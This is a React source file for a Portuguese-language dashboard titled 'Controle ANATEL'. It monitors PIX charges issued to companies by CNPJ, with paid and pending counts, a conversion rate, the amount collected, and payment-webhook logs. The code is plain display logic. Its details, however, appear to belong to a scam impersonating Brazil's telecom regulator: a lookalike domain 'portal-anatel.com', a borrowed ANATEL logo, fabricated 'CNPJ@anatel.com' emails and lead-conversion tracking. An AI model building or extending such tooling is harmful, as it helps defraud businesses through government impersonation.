import React, { useState, useEffect } from 'react';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

// Webhook de Produção
const WEBHOOK_PRODUCAO = "https://portal-anatel.com/api/webhook/zippify";

export default function ControlePage() {
  const [stats, setStats] = useState(null);
  const [transactions, setTransactions] = useState([]);
  const [webhookLogs, setWebhookLogs] = useState([]);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState('links');
  const [filterStatus, setFilterStatus] = useState('');

  const fetchData = async () => {
    try {
      const [statsRes, txRes, logsRes] = await Promise.all([
        axios.get(`${API}/stats/links`),
        axios.get(`${API}/stats/links/details?limit=50${filterStatus ? `&status=${filterStatus}` : ''}`),
        axios.get(`${API}/webhook/logs?limit=30`)
      ]);
      setStats(statsRes.data);
      setTransactions(txRes.data.transactions || []);
      setWebhookLogs(logsRes.data.logs || []);
    } catch (err) {
      console.error('Erro ao buscar dados:', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchData();
    const interval = setInterval(fetchData, 10000);
    return () => clearInterval(interval);
  }, [filterStatus]);

  const formatDate = (d) => d ? new Date(d).toLocaleString('pt-BR') : '-';
  const fmt = (v) => new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(v || 0);

  const getStatusColor = (status) => {
    switch (status) {
      case 'paid': return 'bg-green-500';
      case 'waiting_payment': return 'bg-yellow-500';
      case 'expired': return 'bg-red-500';
      default: return 'bg-gray-500';
    }
  };

  const getStatusLabel = (status) => {
    switch (status) {
      case 'paid': return 'PAGO';
      case 'waiting_payment': return 'PENDENTE';
      case 'expired': return 'EXPIRADO';
      default: return status?.toUpperCase() || 'N/A';
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-[#071D41] flex items-center justify-center">
        <div className="text-white text-xl">Carregando...</div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white">
      {/* Header */}
      <header className="bg-[#071D41] border-b border-gray-700 px-6 py-4">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4">
            <img 
              src="https://customer-assets.emergentagent.com/job_lead-conversion-9/artifacts/ktf9iqob_pngwing.com.png"
              alt="ANATEL"
              className="w-12 h-auto"
            />
            <div>
              <h1 className="text-xl font-bold">Controle ANATEL</h1>
              <p className="text-gray-400 text-sm">Monitoramento de Links e Pagamentos</p>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <span className="text-sm text-gray-400">Auto-refresh: 10s</span>
            <button 
              onClick={fetchData}
              className="px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded text-sm font-medium"
            >
              🔄 Atualizar
            </button>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-6 py-6">
        {/* Cards de Estatísticas */}
        <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4 mb-6">
          <div className="bg-gray-800 rounded-lg p-4">
            <p className="text-gray-400 text-xs uppercase tracking-wide">PIX Gerados</p>
            <p className="text-3xl font-bold text-white">{stats?.total_pix_gerados || 0}</p>
          </div>
          <div className="bg-gray-800 rounded-lg p-4">
            <p className="text-gray-400 text-xs uppercase tracking-wide">PIX Pagos</p>
            <p className="text-3xl font-bold text-green-400">{stats?.pix_pagos || 0}</p>
          </div>
          <div className="bg-gray-800 rounded-lg p-4">
            <p className="text-gray-400 text-xs uppercase tracking-wide">Pendentes</p>
            <p className="text-3xl font-bold text-yellow-400">{stats?.pix_pendentes || 0}</p>
          </div>
          <div className="bg-gray-800 rounded-lg p-4">
            <p className="text-gray-400 text-xs uppercase tracking-wide">Taxa Conversão</p>
            <p className="text-3xl font-bold text-blue-400">{stats?.taxa_conversao || 0}%</p>
          </div>
          <div className="bg-gray-800 rounded-lg p-4">
            <p className="text-gray-400 text-xs uppercase tracking-wide">Arrecadado</p>
            <p className="text-2xl font-bold text-green-400">{fmt(stats?.valor_arrecadado)}</p>
          </div>
          <div className="bg-gray-800 rounded-lg p-4">
            <p className="text-gray-400 text-xs uppercase tracking-wide">CNPJs Únicos</p>
            <p className="text-3xl font-bold text-purple-400">{stats?.cnpjs_unicos || 0}</p>
          </div>
        </div>

        {/* Tabs */}
        <div className="flex gap-2 mb-4">
          <button
            onClick={() => setActiveTab('links')}
            className={`px-4 py-2 rounded font-medium ${activeTab === 'links' ? 'bg-blue-600' : 'bg-gray-700 hover:bg-gray-600'}`}
          >
            📊 Links/Transações
          </button>
          <button
            onClick={() => setActiveTab('webhook')}
            className={`px-4 py-2 rounded font-medium ${activeTab === 'webhook' ? 'bg-blue-600' : 'bg-gray-700 hover:bg-gray-600'}`}
          >
            🔗 Webhook Produção
          </button>
        </div>

        {/* Tab: Links/Transações */}
        {activeTab === 'links' && (
          <div className="bg-gray-800 rounded-lg overflow-hidden">
            {/* Filtros */}
            <div className="px-4 py-3 bg-gray-700 flex items-center gap-4">
              <span className="text-sm text-gray-400">Filtrar por status:</span>
              <select
                value={filterStatus}
                onChange={(e) => setFilterStatus(e.target.value)}
                className="bg-gray-600 text-white px-3 py-1 rounded text-sm"
              >
                <option value="">Todos</option>
                <option value="paid">Pagos</option>
                <option value="waiting_payment">Pendentes</option>
                <option value="expired">Expirados</option>
              </select>
              <span className="text-sm text-gray-400 ml-auto">
                Mostrando {transactions.length} registros
              </span>
            </div>

            {/* Tabela */}
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead className="bg-gray-700 text-gray-300">
                  <tr>
                    <th className="px-4 py-3 text-left">ID</th>
                    <th className="px-4 py-3 text-left">CNPJ</th>
                    <th className="px-4 py-3 text-left">Empresa</th>
                    <th className="px-4 py-3 text-right">Valor</th>
                    <th className="px-4 py-3 text-center">Status</th>
                    <th className="px-4 py-3 text-left">CPF Utilizado</th>
                    <th className="px-4 py-3 text-left">Criado em</th>
                    <th className="px-4 py-3 text-left">Pago em</th>
                  </tr>
                </thead>
                <tbody>
                  {transactions.map((tx, i) => (
                    <tr key={i} className="border-t border-gray-700 hover:bg-gray-700/50">
                      <td className="px-4 py-3 font-mono text-xs text-blue-400">{tx.id}</td>
                      <td className="px-4 py-3 font-mono text-xs">{tx.cnpj}</td>
                      <td className="px-4 py-3 text-xs max-w-[200px] truncate">{tx.nome}</td>
                      <td className="px-4 py-3 text-right font-medium">{fmt(tx.valor)}</td>
                      <td className="px-4 py-3 text-center">
                        <span className={`px-2 py-1 rounded text-xs font-bold text-white ${getStatusColor(tx.status)}`}>
                          {getStatusLabel(tx.status)}
                        </span>
                      </td>
                      <td className="px-4 py-3 font-mono text-xs text-gray-400">{tx.cpf_utilizado || '-'}</td>
                      <td className="px-4 py-3 text-xs text-gray-400">{formatDate(tx.created_at)}</td>
                      <td className="px-4 py-3 text-xs text-green-400">{tx.paid_at ? formatDate(tx.paid_at) : '-'}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}

        {/* Tab: Webhook Produção */}
        {activeTab === 'webhook' && (
          <div className="space-y-6">
            {/* URL do Webhook */}
            <div className="bg-gray-800 rounded-lg p-6">
              <h2 className="text-lg font-bold mb-4 flex items-center gap-2">
                <span className="text-green-400">🔗</span> Webhook de Produção
              </h2>
              
              <div className="bg-gray-900 rounded p-4 mb-4">
                <p className="text-xs text-gray-400 mb-2">Configure este URL no painel da Zippify:</p>
                <div className="flex items-center gap-2">
                  <code className="flex-1 bg-gray-800 px-4 py-3 rounded text-green-400 font-mono text-sm">
                    {WEBHOOK_PRODUCAO}
                  </code>
                  <button
                    onClick={() => {
                      navigator.clipboard.writeText(WEBHOOK_PRODUCAO);
                      alert('URL copiada!');
                    }}
                    className="px-4 py-3 bg-green-600 hover:bg-green-700 rounded font-medium"
                  >
                    📋 Copiar
                  </button>
                </div>
              </div>

              <div className="grid md:grid-cols-2 gap-4 text-sm">
                <div className="bg-gray-900 rounded p-4">
                  <h3 className="font-bold text-yellow-400 mb-2">⚙️ Configuração Zippify</h3>
                  <ol className="list-decimal list-inside space-y-1 text-gray-300">
                    <li>Acesse o painel Zippify</li>
                    <li>Vá em <strong>Configurações → Webhooks</strong></li>
                    <li>Cole a URL acima</li>
                    <li>Selecione evento: <strong>Pagamento PIX Aprovado</strong></li>
                    <li>Salve e teste</li>
                  </ol>
                </div>
                <div className="bg-gray-900 rounded p-4">
                  <h3 className="font-bold text-blue-400 mb-2">📋 Ordem de Busca</h3>
                  <ol className="list-decimal list-inside space-y-1 text-gray-300">
                    <li><strong>Email</strong> (CNPJ@anatel.com) - Prioridade</li>
                    <li><strong>CPF</strong> do cliente</li>
                    <li><strong>ID</strong> da transação</li>
                    <li><strong>Última pendente</strong> (fallback)</li>
                  </ol>
                </div>
              </div>
            </div>

            {/* Logs do Webhook */}
            <div className="bg-gray-800 rounded-lg overflow-hidden">
              <div className="px-4 py-3 bg-gray-700 flex items-center justify-between">
                <h2 className="font-bold">📋 Últimos Webhooks Recebidos</h2>
                <span className="text-sm text-gray-400">{webhookLogs.length} registros</span>
              </div>
              
              <div className="divide-y divide-gray-700 max-h-[500px] overflow-y-auto">
                {webhookLogs.length === 0 ? (
                  <div className="p-8 text-center text-gray-500">
                    Nenhum webhook recebido ainda
                  </div>
                ) : (
                  webhookLogs.map((log, i) => (
                    <div key={i} className="p-4 hover:bg-gray-700/50">
                      <div className="flex items-start justify-between mb-2">
                        <span className="text-xs text-gray-500">{formatDate(log.received_at)}</span>
                        <span className={`px-2 py-0.5 rounded text-xs font-bold ${log.processed ? 'bg-green-600' : 'bg-yellow-600'}`}>
                          {log.processed ? '✅ Processado' : '⏳ Pendente'}
                        </span>
                      </div>
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-2 text-xs">
                        <div>
                          <span className="text-gray-500">Status:</span>
                          <span className="ml-1 text-white">{log.payload?.status || log.payload?.payment_status || 'N/A'}</span>
                        </div>
                        <div>
                          <span className="text-gray-500">Email:</span>
                          <span className="ml-1 text-yellow-400">{log.payload?.customer?.email || 'N/A'}</span>
                        </div>
                        <div>
                          <span className="text-gray-500">Transação:</span>
                          <span className="ml-1 text-blue-400">{log.transaction_id || 'N/A'}</span>
                        </div>
                        <div>
                          <span className="text-gray-500">Método:</span>
                          <span className="ml-1 text-purple-400">{log.search_method || 'N/A'}</span>
                        </div>
                      </div>
                      <details className="mt-2">
                        <summary className="text-xs text-gray-500 cursor-pointer hover:text-gray-300">Ver payload</summary>
                        <pre className="mt-2 text-xs bg-gray-900 p-2 rounded overflow-auto max-h-24 text-gray-400">
                          {JSON.stringify(log.payload, null, 2)}
                        </pre>
                      </details>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
